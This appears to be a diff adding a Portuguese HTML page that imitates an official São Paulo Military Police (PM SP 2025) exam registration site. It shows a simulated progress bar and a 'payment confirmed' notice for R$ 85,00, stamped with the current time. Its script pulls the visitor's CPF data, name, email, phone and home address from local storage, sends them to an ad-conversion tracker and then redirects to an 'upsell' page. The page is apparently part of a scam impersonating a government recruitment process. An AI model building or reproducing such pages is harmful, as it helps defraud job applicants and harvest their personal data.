@@ -1,0 +1,453 @@
+﻿<!doctype html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Registrando Conversão - PM SP 2025</title>
+
+        <!-- Microsoft Clarity Analytics -->
+        <script type="text/javascript">
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
+
+        <!-- Google Ads Gtag.js -->
+        <script async="" src="../../gtag/js-1.js?id=AW-17558615378"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag() {
+                dataLayer.push(arguments);
+            }
+            gtag("js", new Date());
+            gtag("config", "AW-17558615378");
+        </script>
+
+        <!-- Tailwind CSS -->
+        <script src="../../3.4.17"></script>
+        <script src="../../3.4.16-5.js"></script>
+        <link href="../css/all.min-6.css" rel="stylesheet">
+        <link href="../css/home-6.css" rel="stylesheet">
+
+        <style>
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            .loading-animation {
+                animation: pulse 2s infinite;
+            }
+            @keyframes pulse {
+                0% {
+                    transform: scale(1);
+                    opacity: 0.8;
+                }
+                50% {
+                    transform: scale(1.05);
+                    opacity: 1;
+                }
+                100% {
+                    transform: scale(1);
+                    opacity: 0.8;
+                }
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            .spinner {
+                animation: spin 1s linear infinite;
+            }
+            .progress-bar {
+                animation: progress 3s ease-in-out forwards;
+            }
+            @keyframes progress {
+                0% { width: 0%; }
+                33% { width: 30%; }
+                66% { width: 70%; }
+                100% { width: 100%; }
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+        </style>
+    </head>
+
+    <body class="flex flex-col min-h-screen">
+        <header class="gov-header text-white py-2">
+            <div class="container mx-auto flex justify-between items-center px-4">
+                <a class="font-bold text-sm" href="#">
+                    <img src="../images/top_gov-5-5.jpg" alt="Logotipo" class="h-6">
+                </a>
+                <nav>
+                    <ul class="flex space-x-4 text-[10px]">
+                        <li>
+                            <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">PARTICIPE</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">SERVIÇOS</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+                <img src="../images/pmsp-6.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+            </div>
+        </div>
+
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="bg-blue-600 text-white py-3 px-4 text-center">
+                        <h2 class="text-lg font-semibold">
+                            Processando sua Inscrição ⚡
+                        </h2>
+                    </div>
+
+                    <div class="p-8 text-center">
+                        <div class="loading-animation mb-6">
+                            <div class="bg-blue-100 p-6 rounded-full inline-flex items-center justify-center">
+                                <i class="fas fa-cog spinner text-blue-600 text-6xl"></i>
+                            </div>
+                        </div>
+
+                        <h3 class="text-2xl font-bold text-gray-800 mb-4">
+                            Registrando sua Conversão...
+                        </h3>
+
+                        <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                            <p class="text-blue-800 font-medium mb-2">
+                                🔄 Estamos confirmando seu pagamento e registrando sua inscrição no sistema.
+                            </p>
+                            <p class="text-blue-700 text-sm">
+                                Este processo é automático e leva apenas alguns segundos.
+                            </p>
+                        </div>
+
+                        <!-- Barra de progresso -->
+                        <div class="mb-6">
+                            <div class="bg-gray-200 rounded-full h-3 mb-2">
+                                <div class="bg-blue-600 h-3 rounded-full progress-bar"></div>
+                            </div>
+                            <p class="text-sm text-gray-600">Processando... <span id="progress-text">0%</span></p>
+                        </div>
+
+                        <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
+                            <h4 class="font-semibold text-green-800 mb-2">
+                                ✅ Pagamento Confirmado
+                            </h4>
+                            <div class="text-sm text-green-700 space-y-1">
+                                <p><strong>Valor:</strong> R$ 85,00</p>
+                                <p><strong>Status:</strong> Aprovado</p>
+                                <p><strong>Data:</strong> <span id="payment-date"></span></p>
+                            </div>
+                        </div>
+
+                        <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                            <div class="flex items-center justify-center mb-2">
+                                <i class="fas fa-clock text-yellow-600 mr-2"></i>
+                                <span class="text-yellow-800 font-medium">Aguarde...</span>
+                            </div>
+                            <p class="text-yellow-700 text-sm">
+                                Você será redirecionado automaticamente para verificar informações adicionais.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img src="../images/pmsp-6.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+                    <p class="text-sm text-center mb-2">
+                        PM SP 2025 - Soldado 2ª Classe
+                    </p>
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; PM SP - Polícia Militar de São Paulo</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-phone-alt mr-1"></i> 0800 616161
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                
+                // 🛡️ PROTEÇÃO CONTRA CONVERSÃO DUPLICADA POR CPF
+                function checkConversionByCPF() {
+                    try {
+                        // Buscar dados do CPF no localStorage
+                        const cpfData = localStorage.getItem("cpfData");
+                        if (!cpfData) {
+                            console.warn("⚠️ Dados do CPF não encontrados");
+                            return { shouldSend: false, reason: "CPF não encontrado" };
+                        }
+
+                        const cpfInfo = JSON.parse(cpfData);
+                        const cpf = cpfInfo?.DADOS?.CPF || cpfInfo?.cpf;
+                        
+                        if (!cpf) {
+                            console.warn("⚠️ CPF não encontrado nos dados");
+                            return { shouldSend: false, reason: "CPF inválido" };
+                        }
+
+                        // Normalizar CPF (apenas dígitos) e criar chave específica
+                        const cpfDigits = cpf.replace(/\D/g, "");
+                        const cpfConversionKey = `pmsp_main85_conversion_sent_${cpfDigits}`;
+                        
+                        // Verificar se já foi enviada conversão principal para este CPF
+                        const alreadySent = localStorage.getItem(cpfConversionKey);
+                        
+                        if (alreadySent) {
+                            const sentDate = new Date(parseInt(alreadySent));
+                            console.log(`🚫 Conversão principal (R$ 85) já enviada para CPF ${cpfDigits.substring(0,3)}***.***-** em ${sentDate.toLocaleString('pt-BR')}`);
+                            return { shouldSend: false, reason: "CPF já enviou conversão principal", cpf: cpfDigits };
+                        } else {
+                            console.log(`✅ Primeira conversão principal (R$ 85) para CPF ${cpfDigits.substring(0,3)}***.***-**, enviando...`);
+                            return { shouldSend: true, cpf: cpfDigits, conversionKey: cpfConversionKey };
+                        }
+                        
+                    } catch (error) {
+                        console.error("❌ Erro ao verificar CPF:", error);
+                        return { shouldSend: false, reason: "Erro na verificação" };
+                    }
+                }
+
+                const conversionCheck = checkConversionByCPF();
+
+                // Mostrar data atual
+                const now = new Date();
+                const dateString =
+                    now.toLocaleDateString("pt-BR") +
+                    " às " +
+                    now.toLocaleTimeString("pt-BR");
+                document.getElementById("payment-date").textContent = dateString;
+
+                // Simular progresso
+                let progress = 0;
+                const progressText = document.getElementById("progress-text");
+                const progressInterval = setInterval(() => {
+                    progress += Math.random() * 20;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(progressInterval);
+                    }
+                    progressText.textContent = Math.round(progress) + "%";
+                }, 300);
+
+                // 🎯 CONVERSÃO GOOGLE ADS - PAGAMENTO PRINCIPAL R$ 85,00
+                function sendGoogleAdsConversion() {
+                    try {
+                        // Verificar se gtag está disponível
+                        if (typeof gtag === "undefined") {
+                            console.error("❌ gtag não está disponível");
+                            return false;
+                        }
+
+                        // Gerar transaction ID único e robusto
+                        const currentPix = localStorage.getItem("currentPix");
+                        const paymentData = localStorage.getItem("paymentData");
+                        
+                        let transactionId;
+                        if (currentPix) {
+                            try {
+                                const pixData = JSON.parse(currentPix);
+                                transactionId = pixData.payment_code || `curso_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
+                            } catch (e) {
+                                transactionId = `curso_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
+                            }
+                        } else {
+                            transactionId = `curso_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
+                        }
+
+                        // 🔍 Recuperar dados do Google Ads
+                        const gclid = localStorage.getItem('gclid');
+                        const gad_source = localStorage.getItem('gad_source');
+                        const gad_campaignid = localStorage.getItem('gad_campaignid');
+
+                        // 📊 ENHANCED CONVERSIONS - Dados do usuário
+                        let enhancedConversionsData = {};
+                        
+                        try {
+                            // Email
+                            const emailConfirmacao = localStorage.getItem("emailConfirmacao");
+                            if (emailConfirmacao && emailConfirmacao.trim()) {
+                                enhancedConversionsData.email_address = emailConfirmacao.toLowerCase().trim();
+                            }
+
+                            // Dados pessoais do CPF
+                            const cpfData = localStorage.getItem("cpfData");
+                            if (cpfData) {
+                                const cpf = JSON.parse(cpfData);
+                                if (cpf.DADOS && cpf.DADOS.NOME) {
+                                    const nomeCompleto = cpf.DADOS.NOME.toLowerCase().trim();
+                                    const partesNome = nomeCompleto.split(' ').filter(p => p);
+                                    
+                                    if (partesNome.length >= 1) {
+                                        enhancedConversionsData.first_name = partesNome[0];
+                                    }
+                                    if (partesNome.length >= 2) {
+                                        enhancedConversionsData.last_name = partesNome[partesNome.length - 1];
+                                    }
+                                }
+                            }
+
+                            // Dados de endereço
+                            const enderecoData = localStorage.getItem("enderecoData");
+                            if (enderecoData) {
+                                const endereco = JSON.parse(enderecoData);
+                                
+                                // Telefone em formato E.164
+                                if (endereco.telefone) {
+                                    let phone = endereco.telefone.replace(/\D/g, '');
+                                    if (phone.length >= 10) {
+                                        if (!phone.startsWith('55')) {
+                                            phone = '55' + phone;
+                                        }
+                                        enhancedConversionsData.phone_number = '+' + phone;
+                                    }
+                                }
+                                
+                                // Endereço completo
+                                if (endereco.logradouro && endereco.cidade) {
+                                    enhancedConversionsData.home_address = {
+                                        street: `${endereco.logradouro} ${endereco.numero || ''}`.trim(),
+                                        city: endereco.cidade.toLowerCase(),
+                                        region: endereco.uf ? endereco.uf.toUpperCase() : '',
+                                        postal_code: endereco.cep ? endereco.cep.replace(/\D/g, '') : '',
+                                        country: 'BR'
+                                    };
+                                    
+                                    if (endereco.complemento) {
+                                        enhancedConversionsData.home_address.street += ` ${endereco.complemento}`;
+                                    }
+                                }
+                            }
+                        } catch (error) {
+                            console.error("Erro ao processar dados para enhanced conversions:", error);
+                        }
+
+                        // 📤 ENVIAR CONVERSÃO PARA GOOGLE ADS
+                        const conversionData = {
+                            send_to: "AW-17558615378/PyemCJi1i5wbENLqzLRB",
+                            value: 85.0,
+                            currency: "BRL",
+                            transaction_id: transactionId + "_main"
+                        };
+
+                        // Adicionar gclid se disponível
+                        if (gclid && gclid.trim()) {
+                            conversionData.gclid = gclid;
+                        }
+
+                        // Adicionar enhanced conversions se disponível
+                        if (Object.keys(enhancedConversionsData).length > 0) {
+                            conversionData.user_data = enhancedConversionsData;
+                        }
+
+                        // Enviar conversão com confirmação de entrega
+                        conversionData.event_callback = function() {
+                            // Marcar conversão como enviada APENAS após confirmação
+                            if (conversionCheck.conversionKey) {
+                                localStorage.setItem(conversionCheck.conversionKey, Date.now().toString());
+                                console.log(`✅ CPF ${conversionCheck.cpf.substring(0,3)}***.***-** marcado como conversão principal enviada`);
+                            }
+                        };
+                        
+                        gtag("event", "conversion", conversionData);
+                        
+                        // Fallback: marcar como enviado após 3 segundos mesmo sem callback
+                        setTimeout(() => {
+                            if (conversionCheck.conversionKey && !localStorage.getItem(conversionCheck.conversionKey)) {
+                                localStorage.setItem(conversionCheck.conversionKey, Date.now().toString());
+                                console.log(`⏰ Timeout: CPF ${conversionCheck.cpf.substring(0,3)}***.***-** marcado como enviado (fallback)`);
+                            }
+                        }, 3000);
+
+                        // Log de sucesso
+                        console.log("✅ CONVERSÃO ENVIADA COM SUCESSO:", {
+                            conversion_id: "AW-17558615378/PyemCJi1i5wbENLqzLRB",
+                            value: 85.0,
+                            currency: "BRL",
+                            transaction_id: transactionId + "_main",
+                            gclid: gclid || "não disponível",
+                            enhanced_conversions: Object.keys(enhancedConversionsData).length > 0 ? "sim" : "não",
+                            user_data_fields: Object.keys(enhancedConversionsData),
+                            timestamp: new Date().toISOString()
+                        });
+
+                        return true;
+                        
+                    } catch (error) {
+                        console.error("❌ Erro ao enviar conversão:", error);
+                        return false;
+                    }
+                }
+
+                // 🚀 EXECUTAR CONVERSÃO (apenas se CPF ainda não enviou)
+                if (conversionCheck.shouldSend) {
+                    // Aguardar um pouco para garantir que gtag esteja carregado
+                    setTimeout(() => {
+                        const success = sendGoogleAdsConversion();
+                        if (success) {
+                            console.log("🎯 Conversão de R$ 85,00 enviada com sucesso!");
+                        } else {
+                            console.error("🚫 Falha ao enviar conversão");
+                        }
+                    }, 500);
+                }
+
+                // 🔄 REDIRECIONAMENTO DETERMINÍSTICO
+                let redirectExecuted = false;
+                const executeRedirect = () => {
+                    if (!redirectExecuted) {
+                        redirectExecuted = true;
+                        console.log("🔄 Executando redirecionamento para upsell...");
+                        try {
+                            window.location.href = "../regular/";
+                        } catch (error) {
+                            console.error("Erro no redirecionamento:", error);
+                            // Fallback
+                            window.location.replace("../regular/");
+                        }
+                    }
+                };
+
+                // Redirecionamento após 4 segundos
+                setTimeout(executeRedirect, 4000);
+
+                // Redirecionamento de segurança (caso algo dê errado)
+                setTimeout(() => {
+                    if (!redirectExecuted) {
+                        console.log("🚨 Redirecionamento de segurança executado");
+                        executeRedirect();
+                    }
+                }, 6000);
+
+                console.log("⏰ Redirecionamento programado para 4 segundos...");
+            });
+        </script>
+    <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-6" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
